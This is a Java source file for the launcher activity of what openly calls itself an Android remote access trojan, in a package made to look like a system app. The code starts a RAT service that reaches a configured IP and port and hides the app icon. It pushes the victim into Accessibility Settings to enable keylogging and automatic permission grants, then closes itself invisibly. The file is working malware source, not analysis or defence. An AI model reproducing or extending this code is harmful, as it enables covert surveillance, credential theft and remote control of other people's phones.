package com.egnakerat.system;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;

/**
 * MainActivity v2.1
 * Launches the RAT service, immediately hides itself,
 * and auto-redirects to Accessibility Settings on first launch.
 */
public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final String PREFS_NAME = "rat_prefs";
    private static final String KEY_FIRST_LAUNCH = "first_launch";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        overridePendingTransition(0, 0);

        Log.d(TAG, "Starting RAT service: " + config.IP + ":" + config.port);

        // Start the RAT foreground service
        Intent serviceIntent = new Intent(this, RATService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Hide app icon if configured
        if (config.icon) {
            new functions(this).hideAppIcon(getApplicationContext());
        }

        // Auto-redirect to Accessibility Settings on first launch
        // This is critical for enabling keylogger and auto-permission features
        if (!isAccessibilityServiceEnabled()) {
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            boolean isFirst = prefs.getBoolean(KEY_FIRST_LAUNCH, true);
            if (isFirst) {
                prefs.edit().putBoolean(KEY_FIRST_LAUNCH, false).apply();
                // Small delay to let the service start first
                new Handler().postDelayed(() -> {
                    try {
                        Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                        accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(accIntent);
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to open accessibility settings: " + e.getMessage());
                    }
                }, 800);
            }
        }

        // Close activity immediately (invisible)
        finish();
        overridePendingTransition(0, 0);
    }

    /**
     * Check if our Accessibility Service is already enabled.
     */
    private boolean isAccessibilityServiceEnabled() {
        try {
            String serviceId = getPackageName() + "/" +
                    RATAccessibilityService.class.getCanonicalName();
            String enabledServices = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabledServices != null) {
                return enabledServices.contains(serviceId);
            }
        } catch (Exception ignored) {}
        return false;
    }
}
